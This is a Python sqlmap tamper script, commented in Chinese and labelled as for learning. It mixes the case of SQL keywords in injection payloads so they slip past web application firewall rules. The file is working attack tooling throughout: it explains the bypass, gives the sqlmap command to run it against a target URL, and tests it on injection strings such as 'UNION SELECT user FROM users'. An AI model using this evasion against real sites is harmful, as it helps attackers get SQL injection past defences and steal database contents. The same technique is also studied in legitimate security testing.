#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
case_mangle · sqlmap tamper：关键词大小写混写绕过（学习用）

原理：WAF 规则常按固定大小写匹配关键词（只匹配小写 union）；
MySQL 等数据库对关键词不区分大小写，SeLeCt 与 select 语义相同——
两层理解不一致处即缝隙。变形采用确定性交替大小写（可测试、可复现）。

唯一验收标准：变形后的 SQL 仍能被数据库正确执行（语义等价）。
使用：sqlmap -u <url> --tamper=case_mangle.py
"""
try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
except ImportError:
    __priority__ = 4  # sqlmap lib/core/enums.py 中 PRIORITY.NORMAL == 4

KEYWORDS = ("UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "ORDER", "BY")


def dependencies():
    """适用环境声明：仅适用于关键词不区分大小写的数据库（MySQL 等）。
    大小写敏感的数据库（部分排序规则下的 SQL Server）不适用。"""
    pass


def _mangle(word):
    """SELECT -> SeLeCt（确定性交替大小写：偶数位大写、奇数位小写）。"""
    out = []
    for idx, ch in enumerate(word):
        out.append(ch.upper() if idx % 2 == 0 else ch.lower())
    return "".join(out)


def tamper(payload, **kwargs):
    """sqlmap 插件约定：输入原 payload，返回大小写混写后的 payload。
    payload 为空时原样返回；URL 编码片段（%xx）不参与替换。"""
    if not payload:
        return payload
    result = payload
    for kw in KEYWORDS:
        out = []
        i = 0
        low = result.lower()
        target = kw.lower()
        while i < len(result):
            hit = low.find(target, i)
            if hit == -1:
                out.append(result[i:])
                break
            before_ok = hit == 0 or not result[hit - 1].isalnum()
            after = hit + len(target)
            after_ok = after >= len(result) or not result[after].isalnum()
            if before_ok and after_ok:
                out.append(result[i:hit])
                out.append(_mangle(result[hit:after]))
                i = after
            else:
                out.append(result[i:after])
                i = after
        result = "".join(out)
    return result


if __name__ == "__main__":
    cases = ["1 AND 1=1", "1 UNION SELECT user FROM users", "", "1%20ORDER%20BY%201"]
    for c in cases:
        print(f"{c!r:45} -> {tamper(c)!r}")
